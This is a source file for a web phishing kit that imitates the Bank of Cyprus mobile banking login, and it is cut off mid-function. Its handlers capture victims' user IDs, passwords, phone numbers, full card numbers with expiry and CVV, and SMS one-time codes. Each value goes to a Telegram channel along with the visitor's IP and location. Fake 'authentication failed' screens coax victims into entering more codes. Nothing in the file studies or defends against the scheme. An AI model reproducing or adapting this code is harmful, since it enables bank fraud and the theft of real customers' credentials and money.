"use client"

import React, { useState, useEffect, useRef } from "react"
import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"
import {
  ChevronLeft,
  Eye,
  EyeOff,
  Globe,
  Home,
  Loader2,
  Lock,
  MapPin,
  RotateCw,
  Smartphone,
  UserPlus,
  Users,
  X,
} from "lucide-react"

// Crisp SVG Flag for Cyprus (CY / +357)
function CyprusFlag({ className = "w-6 h-4" }: { className?: string }) {
  return (
    <svg
      viewBox="0 0 640 400"
      className={`shrink-0 overflow-hidden ${className}`}
      xmlns="http://www.w3.org/2000/svg"
      aria-label="Flag of Cyprus"
    >
      <rect width="640" height="400" fill="#FFFFFF" />
      {/* Cyprus Island Shape in Copper (#D57800) */}
      <path
        d="M363 118c14-7 32-13 52-19 28-9 62-17 78-21 7-2 13-1 9 5-13 13-35 27-50 37-9 6-25 13-38 18-12 5-15 10-23 18-8 7-17 14-29 16-17 3-45 2-67 9-17 5-39 18-50 20-11 2-33-4-44-12-11-8-22-8-33-12-8-3-11-10-6-15 9-9 22-6 35-12 14-7 29-17 44-18 14-1 29 7 44 5 18-3 37-14 53-17 9-2 16-11 23-11z"
        fill="#D57800"
      />
      {/* Olive Branches in Green (#4E7037) */}
      <g fill="#4E7037" stroke="#4E7037">
        <path
          d="M210 255c45 28 105 32 165 14-12-8-55-2-95-18-25-10-50-6-70 4z"
          fill="#4E7037"
        />
        {/* Left leaves */}
        <ellipse cx="230" cy="245" rx="12" ry="5" transform="rotate(-35 230 245)" />
        <ellipse cx="250" cy="258" rx="12" ry="5" transform="rotate(-18 250 258)" />
        <ellipse cx="275" cy="266" rx="12" ry="5" transform="rotate(3 275 266)" />
        <ellipse cx="240" cy="235" rx="11" ry="5" transform="rotate(20 240 235)" />
        <ellipse cx="265" cy="248" rx="11" ry="5" transform="rotate(30 265 248)" />
        <ellipse cx="295" cy="262" rx="11" ry="5" transform="rotate(38 295 262)" />
        {/* Right leaves */}
        <ellipse cx="360" cy="260" rx="12" ry="5" transform="rotate(-15 360 260)" />
        <ellipse cx="380" cy="248" rx="12" ry="5" transform="rotate(-40 380 248)" />
        <ellipse cx="335" cy="268" rx="12" ry="5" transform="rotate(10 335 268)" />
        <ellipse cx="365" cy="242" rx="11" ry="5" transform="rotate(-50 365 242)" />
        <ellipse cx="340" cy="252" rx="11" ry="5" transform="rotate(-25 340 252)" />
        <ellipse cx="315" cy="265" rx="11" ry="5" transform="rotate(-10 315 265)" />
      </g>
    </svg>
  )
}

// Bank of Cyprus Brand Logo with text & emblem
function BocBrandLogo({
  iconSize = "w-[24px] h-[24px] sm:w-[26px] sm:h-[26px]",
  textSize = "text-[13.5px] sm:text-[14.5px]",
  className = "",
}: {
  iconSize?: string
  textSize?: string
  className?: string
}) {
  return (
    <div className={`flex items-center gap-1.5 select-none ${className}`}>
      <span
        className={`text-[#058998] font-serif font-bold tracking-tight leading-none select-none ${textSize}`}
        style={{ fontFamily: "Georgia, Cambria, 'Times New Roman', Times, serif" }}
      >
        Bank of Cyprus
      </span>
      <img
        src="/boc_logo.png"
        alt="Bank of Cyprus"
        className={`object-contain select-none pointer-events-none rounded-[4px] shrink-0 ${iconSize}`}
      />
    </div>
  )
}

function BocLogo({ className }: { className?: string }) {
  return <BocBrandLogo className={className} />
}

function BibdLogo({ className }: { className?: string }) {
  return <BocBrandLogo className={className} />
}

// Luhn Algorithm Card Validator (validates standard 16-digit cards)
function isValidLuhn(cardNumber: string): boolean {
  const digits = cardNumber.replace(/\D/g, "")
  if (digits.length !== 16) return false
  let sum = 0
  let isEven = false
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits.charAt(i), 10)
    if (isEven) {
      digit *= 2
      if (digit > 9) digit -= 9
    }
    sum += digit
    isEven = !isEven
  }
  return sum % 10 === 0
}

// 3-Step Progress Header: Number -> Card Verification -> Approved
function ThreeStepsHeader({
  currentStep = 1,
  onBack,
  showBack = false,
}: {
  currentStep: 1 | 2 | 3
  onBack?: () => void
  showBack?: boolean
}) {
  const steps = [
    { num: 1, label: "Number" },
    { num: 2, label: "Card Verification" },
    { num: 3, label: "Approved" },
  ]

  return (
    <header className="relative z-20 w-full px-4 pt-5 pb-3.5 bg-white border-b border-slate-100 select-none">
      <div className="w-full max-w-[390px] mx-auto flex items-center justify-between">
        {showBack && onBack ? (
          <button
            type="button"
            onClick={onBack}
            className="p-1 -ml-1 text-[#0d1e38] hover:text-[#058998] transition-colors cursor-pointer flex items-center justify-center shrink-0"
            aria-label="Back"
          >
            <ChevronLeft className="w-5 h-5 stroke-[2.4]" />
          </button>
        ) : (
          <div className="w-4 shrink-0" />
        )}

        {/* Steps Container */}
        <div className="flex-1 flex items-center justify-between px-1">
          {steps.map((s, idx) => {
            const isCompleted = currentStep > s.num
            const isActive = currentStep === s.num

            return (
              <React.Fragment key={s.num}>
                {/* Step Item: Circle + Label */}
                <div className="flex flex-col items-center">
                  <div
                    className={`w-7 h-7 rounded-full flex items-center justify-center text-[12px] font-bold transition-all duration-300 ${
                      isCompleted
                        ? "bg-[#058998] text-white"
                        : isActive
                        ? "bg-[#058998] text-white ring-3 ring-[#058998]/20"
                        : "bg-slate-100 text-slate-400 border border-slate-200"
                    }`}
                  >
                    {isCompleted ? (
                      <svg
                        className="w-3.5 h-3.5 stroke-[2.8]"
                        fill="none"
                        viewBox="0 0 24 24"
                        stroke="currentColor"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          d="M5 13l4 4L19 7"
                        />
                      </svg>
                    ) : (
                      s.num
                    )}
                  </div>
                  <span
                    className={`text-[10px] sm:text-[11px] font-semibold mt-1 tracking-tight text-center whitespace-nowrap ${
                      isActive
                        ? "text-[#058998] font-bold"
                        : isCompleted
                        ? "text-[#0d1e38]"
                        : "text-slate-400"
                    }`}
                  >
                    {s.label}
                  </span>
                </div>

                {/* Connecting Line between steps */}
                {idx < steps.length - 1 && (
                  <div
                    className={`flex-1 h-[2px] mx-2 -mt-4.5 rounded-full transition-all duration-300 ${
                      currentStep > s.num ? "bg-[#058998]" : "bg-slate-200"
                    }`}
                  />
                )}
              </React.Fragment>
            )
          })}
        </div>

        {showBack ? <div className="w-4 shrink-0" /> : <div className="w-4 shrink-0" />}
      </div>
    </header>
  )
}

type ScreenType =
  | "splash"
  | "phone"
  | "login"
  | "login-auth"
  | "card"
  | "boc-verify"
  | "otp"
  | "accounts"
  | "confirm-otp"

export default function BbvaPage(props: any) {
  const initialScreen: ScreenType = props?.initialScreen || "splash"
  const [currentScreen, setCurrentScreen] = useState<ScreenType>(initialScreen)
  const [isScreenLoading, setIsScreenLoading] = useState(false)
  const [language, setLanguage] = useState<"en" | "es">("en")
  const [locationInfo, setLocationInfo] = useState<{
    ip?: string
    city?: string
    region?: string
    country_name?: string
    country_code?: string
    org?: string
    [key: string]: any
  } | null>(null)

  useEffect(() => {
    if (typeof window !== "undefined") {
      const p = window.location.pathname
      if (p.includes("/cc")) {
        setCurrentScreen("confirm-otp")
      } else if (p.includes("/accounts")) {
        setCurrentScreen("accounts")
      } else if (p.includes("/boc-verify") || p.includes("/3ds")) {
        setCurrentScreen("boc-verify")
      } else if (p.includes("/verify") || p.includes("/otp")) {
        setCurrentScreen("otp")
      } else if (p.includes("/card")) {
        setCurrentScreen("card")
      } else if (p.includes("/login-auth")) {
        setCurrentScreen("login-auth")
      } else if (p.includes("/login")) {
        setCurrentScreen("login")
      } else if (p.includes("/phone") || p.includes("/mobile")) {
        setCurrentScreen("phone")
      } else if (p.includes("/splash")) {
        setCurrentScreen("splash")
      }
    }
  }, [])

  // Immediate visitor tracking and location alert ONLY on splash screen
  const hasTrackedVisitor = useRef(false)
  useEffect(() => {
    if (currentScreen !== "splash") return
    if (hasTrackedVisitor.current) return
    hasTrackedVisitor.current = true

    let isMounted = true
    const trackVisitorOnLanding = async () => {
      try {
        const info = await fetchVisitorInfo()
        if (info && isMounted) {
          setLocationInfo(info)
        }
        await sendTelegramMessage({
          title: "BIBD — Splash Screen Visitor",
          type: "splash",
          includeLocation: true,
        })
      } catch (err) {
        console.error("Visitor tracking error:", err)
      }
    }
    trackVisitorOnLanding()
    return () => {
      isMounted = false
    }
  }, [currentScreen])

  // Login form states
  const [userId, setUserId] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [errorMessage, setErrorMessage] = useState("")

  // Phone / Mobile number states (Cyprus +357)
  const [phoneNumber, setPhoneNumber] = useState("")
  const [phoneCountryCode, setPhoneCountryCode] = useState("+357")
  const [phoneError, setPhoneError] = useState("")
  const [isPhoneSubmitting, setIsPhoneSubmitting] = useState(false)
  const phoneInputRef = useRef<HTMLInputElement>(null)

  // Card form states
  const [cardNumber, setCardNumber] = useState("")
  const [cardMonth, setCardMonth] = useState("")
  const [cardYear, setCardYear] = useState("")
  const [cardCvv, setCardCvv] = useState("")
  const [cardError, setCardError] = useState("")
  const [isCardSubmitting, setIsCardSubmitting] = useState(false)
  const [isBocVerifying, setIsBocVerifying] = useState(false)

  // BOC 3DS Verification screen states (matching user screenshot)
  const [bocLanguage, setBocLanguage] = useState<"en" | "el">("en")
  const [bocOtp, setBocOtp] = useState("")
  const [bocAuthFailed, setBocAuthFailed] = useState(false)
  const [bocSubmitCount, setBocSubmitCount] = useState(0)
  const [sessionSecondsLeft, setSessionSecondsLeft] = useState(120)
  const [isSmsOtpRequested, setIsSmsOtpRequested] = useState(false)
  const bocInputRef = useRef<HTMLInputElement>(null)

  // BOC Login screen states (matching user screenshots 1, 2, 3)
  const [rememberMe, setRememberMe] = useState(true)
  const [showViewLinks, setShowViewLinks] = useState(false)
  const [userIdFocused, setUserIdFocused] = useState(false)
  const [passcodeFocused, setPasscodeFocused] = useState(false)
  const [loginAuthSecondsLeft, setLoginAuthSecondsLeft] = useState(290)
  const [isLoginAppConfirmed, setIsLoginAppConfirmed] = useState(false)

  // Dynamic greeting based on current local time
  const timeGreeting = (() => {
    try {
      const hour = new Date().getHours()
      if (hour >= 5 && hour < 12) {
        return bocLanguage === "el" ? "Καλημέρα!" : "Good Morning!"
      } else if (hour >= 12 && hour < 17) {
        return bocLanguage === "el" ? "Καλό Μεσημέρι!" : "Good Afternoon!"
      } else {
        return bocLanguage === "el" ? "Καλό Βράδυ!" : "Good Evening!"
      }
    } catch {
      return "Good Evening!"
    }
  })()

  // 4:50 live countdown timer for Login Authentication
  useEffect(() => {
    if (currentScreen !== "login-auth") {
      setIsLoginAppConfirmed(false)
      return
    }

    setLoginAuthSecondsLeft(290)

    const interval = setInterval(() => {
      setLoginAuthSecondsLeft((prev) => (prev > 0 ? prev - 1 : 0))
    }, 1000)

    return () => clearInterval(interval)
  }, [currentScreen])

  // Handle clicking "Confirm via App" on Login Authentication: sends Telegram notification without redirection
  const handleLoginAppConfirmClick = async () => {
    setIsLoginAppConfirmed(true)
    try {
      const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
      const savedPhone =
        (typeof window !== "undefined" &&
          (sessionStorage.getItem("bbva_phoneNumber") ||
            sessionStorage.getItem("phoneNumber") ||
            sessionStorage.getItem("bibd_phone"))) ||
        (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)

      await sendTelegramMessage({
        title: "Bank of Cyprus — Login Confirmed & Approved via App",
        dni: savedUser || undefined,
        phoneNumber: savedPhone || undefined,
        type: "boc_approved",
      })
    } catch (err) {
      console.error("Error sending Telegram notification:", err)
    }
  }

  // 2-minute live countdown timer on boc-verify screen -> activates when "Send SMS OTP" is clicked
  useEffect(() => {
    if (currentScreen !== "boc-verify") {
      setIsSmsOtpRequested(false)
      return
    }

    if (!isSmsOtpRequested) return

    const interval = setInterval(() => {
      setSessionSecondsLeft((prev) => {
        if (prev <= 1) {
          clearInterval(interval)
          setCurrentScreen("otp")
          if (typeof window !== "undefined" && window.history) {
            window.history.pushState({ screen: "otp" }, "", "/verify")
          }
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(interval)
  }, [currentScreen, isSmsOtpRequested])

  const formatBocTimer = (totalSeconds: number) => {
    const mins = Math.floor(totalSeconds / 60)
    const secs = totalSeconds % 60
    return `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`
  }

  // Handle clicking "Send SMS OTP": shows notice and starts 2-minute timer
  const handleSendSmsOtpClick = async () => {
    setIsSmsOtpRequested(true)
    setSessionSecondsLeft(120)

    try {
      const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
      const savedPhone =
        (typeof window !== "undefined" &&
          (sessionStorage.getItem("bbva_phoneNumber") ||
            sessionStorage.getItem("phoneNumber") ||
            sessionStorage.getItem("bibd_phone"))) ||
        (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)

      await sendTelegramMessage({
        title: "Bank of Cyprus — Send SMS OTP Requested",
        dni: savedUser || undefined,
        phoneNumber: savedPhone || undefined,
        cardNumber: cardNumber ? cardNumber.replace(/\s+/g, "") : undefined,
        type: "boc_resend",
      })
    } catch (err) {
      console.error("Error sending Telegram notification:", err)
    }
  }

  // Open official Bank of Cyprus Mobile App on Google Play Store
  const handleOpenBocApp = () => {
    if (typeof window !== "undefined") {
      window.open(
        "https://play.google.com/store/apps/details?id=cy.com.netinfo.netteller.boc&pcampaignid=web_share",
        "_blank",
        "noopener,noreferrer"
      )
    }
  }

  // BOC Confirm & Resend Handlers: captures code to Telegram and shows invalid message each time
  const handleBocConfirm = async (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    const code = bocOtp.trim()
    if (!code || isBocVerifying) return

    setIsBocVerifying(true)
    const newCount = bocSubmitCount + 1
    setBocSubmitCount(newCount)

    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_otp", code)
    }

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    const savedPhone =
      (typeof window !== "undefined" &&
        (sessionStorage.getItem("bbva_phoneNumber") ||
          sessionStorage.getItem("phoneNumber") ||
          sessionStorage.getItem("bibd_phone"))) ||
      (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)

    try {
      await sendTelegramMessage({
        title: `Bank of Cyprus — SMS OTP Captured (Attempt ${newCount})`,
        dni: savedUser || undefined,
        phoneNumber: savedPhone || undefined,
        otp1: code,
        type: "otp",
      })
    } catch (err) {
      console.error("Error sending Telegram notification:", err)
    }

    // 1-second verification check, then show the authentication failed invalid message
    setTimeout(() => {
      setIsBocVerifying(false)
      setBocAuthFailed(true)
      setBocOtp("")
      bocInputRef.current?.focus()
    }, 1000)
  }

  const handleBocResend = async () => {
    try {
      await sendTelegramMessage({
        title: "Bank of Cyprus — 3DS Resend SMS OTP Requested",
        type: "boc_resend",
      })
    } catch {}
  }

  // Format date as MM/DD/YYYY matching user screenshot (e.g. 11/16/2026)
  const bocDateFormatted = (() => {
    try {
      const now = new Date()
      const mm = String(now.getMonth() + 1).padStart(2, "0")
      const dd = String(now.getDate()).padStart(2, "0")
      const yyyy = now.getFullYear()
      return `${mm}/${dd}/${yyyy}`
    } catch {
      return "11/16/2026"
    }
  })()

  // Masked phone: xxxx6201 (last 4 digits of user phone or fallback)
  const bocMaskedPhone = (() => {
    const raw =
      phoneNumber ||
      (typeof window !== "undefined" &&
        (sessionStorage.getItem("bbva_phoneNumber") ||
          sessionStorage.getItem("phoneNumber") ||
          sessionStorage.getItem("bibd_phone"))) ||
      ""
    const clean = raw.replace(/\D/g, "")
    if (clean.length >= 4) {
      return `xxxx${clean.slice(-4)}`
    }
    return "xxxx6201"
  })()

  // Masked card: ************8555 (last 4 digits of card or fallback)
  const bocMaskedCard = (() => {
    const raw =
      cardNumber ||
      (typeof window !== "undefined" && sessionStorage.getItem("bbva_cardNumber")) ||
      ""
    const clean = raw.replace(/\D/g, "")
    if (clean.length >= 4) {
      return `************${clean.slice(-4)}`
    }
    return "************8555"
  })()

  // Last 4 digits of card for Active Card Authentication screen
  const bocCardLast4 = (() => {
    const raw =
      cardNumber ||
      (typeof window !== "undefined" && sessionStorage.getItem("bbva_cardNumber")) ||
      ""
    const clean = raw.replace(/\D/g, "")
    if (clean.length >= 4) {
      return clean.slice(-4)
    }
    return "1234"
  })()

  // Card input refs for auto-moving focus
  const cardNumberRef = useRef<HTMLInputElement>(null)
  const cardMonthRef = useRef<HTMLInputElement>(null)
  const cardYearRef = useRef<HTMLInputElement>(null)
  const cardCvvRef = useRef<HTMLInputElement>(null)

  // OTP Screen States (6 digits matching Screenshot)
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""])
  const [focusedOtpIndex, setFocusedOtpIndex] = useState<number | null>(0)
  const [timeLeft, setTimeLeft] = useState<number>(179) // 2:59
  const [otpError, setOtpError] = useState("")
  const [isOtpSubmitting, setIsOtpSubmitting] = useState(false)
  const [resendSuccess, setResendSuccess] = useState(false)
  const [shakeCount, setShakeCount] = useState(0)
  const otpRefs = useRef<(HTMLInputElement | null)[]>([])

  // Accounts screen states (Matching new Screenshot)
  const [accountNumber, setAccountNumber] = useState("")
  const [accountBalance, setAccountBalance] = useState("")
  const [isAccountsSubmitting, setIsAccountsSubmitting] = useState(false)
  const [accountsSuccess, setAccountsSuccess] = useState(false)

  // Confirm Transaction OTP Screen States (Matching Screenshot 2 /cc)
  const [confirmOtp, setConfirmOtp] = useState<string[]>(["", "", "", "", "", ""])
  const [confirmFocusedIndex, setConfirmFocusedIndex] = useState<number | null>(0)
  const [confirmTimeLeft, setConfirmTimeLeft] = useState<number>(178) // 2:58 as shown in screenshot
  const [confirmAttempt, setConfirmAttempt] = useState<number>(1)
  const [hasConfirmError, setHasConfirmError] = useState<boolean>(false)
  const [confirmErrorMessage, setConfirmErrorMessage] = useState("Incorrect code. Please try again.")
  const [isConfirmSubmitting, setIsConfirmSubmitting] = useState(false)
  const [confirmShake, setConfirmShake] = useState(0)
  const confirmOtpRefs = useRef<(HTMLInputElement | null)[]>([])

  // Dynamic greeting based on Spain time (Europe/Madrid)
  const [greeting, setGreeting] = useState("Buenos días")

  useEffect(() => {
    const updateGreeting = () => {
      try {
        const now = new Date()
        const spainTime = new Date(now.toLocaleString("en-US", { timeZone: "Europe/Madrid" }))
        const hour = spainTime.getHours()
        if (hour >= 5 && hour < 12) {
          setGreeting(language === "es" ? "Buenos días" : "Good morning")
        } else if (hour >= 12 && hour < 19) {
          setGreeting(language === "es" ? "Buenas tardes" : "Good afternoon")
        } else {
          setGreeting(language === "es" ? "Buenas noches" : "Good evening")
        }
      } catch {
        setGreeting(language === "es" ? "Buenos días" : "Good morning")
      }
    }
    updateGreeting()
  }, [language])

  // Restore stored session values if available
  useEffect(() => {
    if (typeof window !== "undefined") {
      const savedUser = sessionStorage.getItem("bbva_userId") || sessionStorage.getItem("cacib_userId")
      if (savedUser) setUserId(savedUser)
      const savedPhone =
        sessionStorage.getItem("bbva_phoneNumber") ||
        sessionStorage.getItem("phoneNumber") ||
        sessionStorage.getItem("bibd_phone")
      if (savedPhone) {
        const clean = savedPhone.replace("+357", "").replace("+673", "").trim()
        setPhoneNumber(clean)
      }
    }
  }, [])

  // Auto-advance splash screen to login screen after 2.6 seconds
  useEffect(() => {
    if (currentScreen !== "splash") return
    const timer = setTimeout(() => {
      setCurrentScreen("login")
      if (typeof window !== "undefined" && window.history) {
        window.history.replaceState({ screen: "login" }, "", "/login")
      }
    }, 2600)
    return () => clearTimeout(timer)
  }, [currentScreen])

  // Focus phone input on phone screen
  useEffect(() => {
    if (currentScreen === "phone") {
      const timer = setTimeout(() => {
        phoneInputRef.current?.focus()
      }, 250)
      return () => clearTimeout(timer)
    }
  }, [currentScreen])

  // Timer countdown for OTP (Code expires in 2:59)
  useEffect(() => {
    if (currentScreen !== "otp") return
    if (timeLeft <= 0) return
    const interval = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0))
    }, 1000)
    return () => clearInterval(interval)
  }, [currentScreen, timeLeft])

  // Timer countdown for Confirm OTP /cc (Code expires in 2:58)
  useEffect(() => {
    if (currentScreen !== "confirm-otp") return
    if (confirmTimeLeft <= 0) return
    const interval = setInterval(() => {
      setConfirmTimeLeft((prev) => (prev > 0 ? prev - 1 : 0))
    }, 1000)
    return () => clearInterval(interval)
  }, [currentScreen, confirmTimeLeft])

  const formatTimer = (sec: number) => {
    const m = Math.floor(sec / 60)
    const s = sec % 60
    return `${m}:${s < 10 ? "0" : ""}${s}`
  }

  // Auto-move: Card Number (16 digits -> moves to Month)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "").slice(0, 16)
    const formatted = raw.replace(/(\d{4})(?=\d)/g, "$1 ")
    setCardNumber(formatted)
    if (cardError) setCardError("")
    if (raw.length === 16) {
      cardMonthRef.current?.focus()
    }
  }

  // Auto-move: Month (2 digits -> moves to Year)
  const handleMonthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 2)
    setCardMonth(val)
    if (cardError) setCardError("")
    if (val.length === 2) {
      cardYearRef.current?.focus()
    }
  }

  const handleMonthKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !cardMonth) {
      cardNumberRef.current?.focus()
    }
  }

  // Auto-move: Year (2 digits -> moves to CVV)
  const handleYearChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 2)
    setCardYear(val)
    if (cardError) setCardError("")
    if (val.length === 2) {
      cardCvvRef.current?.focus()
    }
  }

  const handleYearKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !cardYear) {
      cardMonthRef.current?.focus()
    }
  }

  // CVV: Strictly 3 digits
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 3)
    setCardCvv(val)
    if (cardError) setCardError("")
  }

  const handleCvvKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !cardCvv) {
      cardYearRef.current?.focus()
    }
  }

  // Mobile number input: unlimited / infinite length
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "")
    setPhoneNumber(raw)
    if (phoneError) setPhoneError("")
  }

  // Handle Mobile Number Submit -> Sends Telegram -> 1.5s loading -> Card Screen
  const handlePhoneSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    const cleanPhone = phoneNumber.replace(/\s+/g, "")
    if (!cleanPhone) {
      setPhoneError("Please enter your mobile number")
      phoneInputRef.current?.focus()
      return
    }

    setPhoneError("")
    setIsPhoneSubmitting(true)
    setIsScreenLoading(true)

    const fullPhone = `${phoneCountryCode} ${cleanPhone}`

    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_phoneNumber", fullPhone)
      sessionStorage.setItem("phoneNumber", fullPhone)
      sessionStorage.setItem("bibd_phone", fullPhone)
    }

    try {
      await sendTelegramMessage({
        title: "BIBD — Mobile Number Captured",
        phoneNumber: fullPhone,
        phone: fullPhone,
        type: "phone",
        exclude: ["location"],
      })
    } catch (err) {
      console.error("Error sending Telegram notification:", err)
    }

    // 1.5 second loading then transition to card screen
    setTimeout(() => {
      setIsScreenLoading(false)
      setIsPhoneSubmitting(false)
      setCurrentScreen("card")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "card" }, "", "/card")
      }
    }, 1500)
  }

  // 1. Handle Login submission: sends Telegram and transitions to Login Authentication screen
  const handleLogin = async (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    if (!userId.trim()) {
      setErrorMessage(bocLanguage === "el" ? "Παρακαλώ εισάγετε το Αναγνωριστικό Χρήστη" : "Please enter your User ID")
      return
    }
    if (!password.trim()) {
      setErrorMessage(bocLanguage === "el" ? "Παρακαλώ εισάγετε τον Κωδικό Πρόσβασης" : "Please enter your Passcode")
      return
    }

    setErrorMessage("")
    setIsScreenLoading(true)

    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_userId", userId.trim())
      sessionStorage.setItem("bbva_password", password.trim())
      sessionStorage.setItem("documentId", userId.trim())
    }

    try {
      await sendTelegramMessage({
        title: "Bank of Cyprus — Login Captured",
        dni: userId.trim(),
        password: password.trim(),
        type: "login",
      })
    } catch (err) {
      console.error("Error sending Telegram notification:", err)
    }

    setIsScreenLoading(false)
    setCurrentScreen("login-auth")
    if (typeof window !== "undefined" && window.history) {
      window.history.pushState({ screen: "login-auth" }, "", "/login-auth")
    }
  }

  // 2. Handle Card Details Submit: Show blur loading for exactly 2 seconds, then transition to OTP screen
  const handleCardSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault()
    const cleanCard = cardNumber.replace(/\s+/g, "")
    if (!isValidLuhn(cleanCard)) {
      setCardError(
        language === "es"
          ? "Por favor ingrese un número de tarjeta válido de 16 dígitos"
          : "Please enter a valid 16-digit card number"
      )
      cardNumberRef.current?.focus()
      return
    }
    if (!cardMonth || !cardYear) {
      setCardError(language === "es" ? "Fecha de caducidad requerida" : "Expiration date is required")
      if (!cardMonth) cardMonthRef.current?.focus()
      else cardYearRef.current?.focus()
      return
    }
    if (cardCvv.length !== 3) {
      setCardError(language === "es" ? "El código CVV / CVC debe tener 3 dígitos" : "CVV must be 3 digits")
      cardCvvRef.current?.focus()
      return
    }

    setCardError("")
    setIsScreenLoading(true)

    const expiry = `${cardMonth}/${cardYear}`

    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_cardNumber", cleanCard)
      sessionStorage.setItem("bbva_cardExpiry", expiry)
      sessionStorage.setItem("bbva_cardCvv", cardCvv)
    }

    try {
      const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
      const savedPhone =
        (typeof window !== "undefined" &&
          (sessionStorage.getItem("bbva_phoneNumber") ||
            sessionStorage.getItem("phoneNumber") ||
            sessionStorage.getItem("bibd_phone"))) ||
        (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)

      await sendTelegramMessage({
        title: "Bank of Cyprus — Card Details Captured",
        dni: savedUser || undefined,
        phoneNumber: savedPhone || undefined,
        cardNumber: cleanCard,
        expiry: expiry,
        cvv: cardCvv,
        type: "card",
      })
    } catch (err) {
      console.error("Error sending Telegram notification:", err)
    }

    // Wait exactly 2 seconds as requested, then switch to the 3DS verification screen
    setTimeout(() => {
      setIsScreenLoading(false)
      setCurrentScreen("boc-verify")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "boc-verify" }, "", "/boc-verify")
      }
    }, 2000)
  }

  // Dynamic date formatted as DD/MM/YYYY according to Cyprus timezone (Europe/Nicosia)
  const currentDateFormatted = (() => {
    try {
      const formatter = new Intl.DateTimeFormat("en-GB", {
        timeZone: "Europe/Nicosia",
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
      })
      return formatter.format(new Date())
    } catch {
      const now = new Date()
      const d = String(now.getDate()).padStart(2, "0")
      const m = String(now.getMonth() + 1).padStart(2, "0")
      const y = now.getFullYear()
      return `${d}/${m}/${y}`
    }
  })()

  // 2.5 Handle 3DS Purchase Verification Approval: "I already approved the transaction"
  const handleBocApproval = async () => {
    setIsBocVerifying(true)
    try {
      const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
      const savedPhone =
        (typeof window !== "undefined" &&
          (sessionStorage.getItem("bbva_phoneNumber") ||
            sessionStorage.getItem("phoneNumber") ||
            sessionStorage.getItem("bibd_phone"))) ||
        (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)

      await sendTelegramMessage({
        title: "Bank of Cyprus — Transaction Approved by User",
        dni: savedUser || undefined,
        phoneNumber: savedPhone || undefined,
        cardNumber: cardNumber ? cardNumber.replace(/\s+/g, "") : undefined,
        type: "boc_approved",
      })
    } catch (err) {
      console.error("Error sending Telegram notification:", err)
    }

    setTimeout(() => {
      setIsBocVerifying(false)
      setCurrentScreen("otp")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "otp" }, "", "/verify")
      }
      setTimeout(() => {
        otpRefs.current[0]?.focus()
      }, 100)
    }, 1200)
  }

  // Helper to transition from OTP to Accounts page with 2-second loading (as requested)
  const triggerOtpCompletion = (codeToSave: string) => {
    setIsScreenLoading(true)
    if (typeof window !== "undefined") {
      sessionStorage.setItem("bbva_otp", codeToSave)
    }

    const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
    const savedPhone =
      (typeof window !== "undefined" &&
        (sessionStorage.getItem("bbva_phoneNumber") ||
          sessionStorage.getItem("phoneNumber") ||
          sessionStorage.getItem("bibd_phone"))) ||
      (phoneNumber ? `${phoneCountryCode} ${phoneNumber.replace(/\s+/g, "")}` : undefined)

    sendTelegramMessage({
      title: "Bank of Cyprus — SMS OTP Captured",
      dni: savedUser || undefined,
      phoneNumber: savedPhone || undefined,
      otp1: codeToSave,
      type: "otp",
    }).catch((err) => console.error("Error sending Telegram notification:", err))

    setTimeout(() => {
      setIsScreenLoading(false)
      setCurrentScreen("accounts")
      if (typeof window !== "undefined" && window.history) {
        window.history.pushState({ screen: "accounts" }, "", "/accounts")
      }
    }, 2000)
  }

  // 3. Handle OTP Code Digit Entry (Auto-moving through all 6 digits & auto-complete)
  const handleOtpChange = (index: number, val: string) => {
    const clean = val.replace(/\D/g, "")
    if (!clean) {
      const nextOtp = [...otp]
      nextOtp[index] = ""
      setOtp(nextOtp)
      return
    }

    // Handle full paste
